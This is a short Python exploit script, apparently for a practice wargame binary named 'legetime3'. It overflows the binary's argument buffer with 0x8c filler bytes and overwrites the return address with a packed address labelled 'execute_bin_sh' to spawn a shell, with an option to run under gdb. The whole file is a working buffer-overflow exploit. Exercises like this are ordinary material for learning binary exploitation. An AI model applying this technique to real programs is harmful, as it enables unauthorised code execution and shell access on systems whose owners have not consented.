#!/usr/bin/env python

TARGET = "legetime3"

#~~~~~~~~~
import sys, os, struct
DEBUG  = 'DEBUG' in sys.argv
def p(a):
  return struct.pack('I', a)
def run(args):
    if DEBUG:
      os.execvp("gdb", ["gdb", "--args", TARGET] + args)
    else:
      os.execv(TARGET, [TARGET] + args)
#~~~~~~~~~

execute_bin_sh = p(0x08048424)
arg = 'A'*0x8c + execute_bin_sh
args = [arg]

run(args)
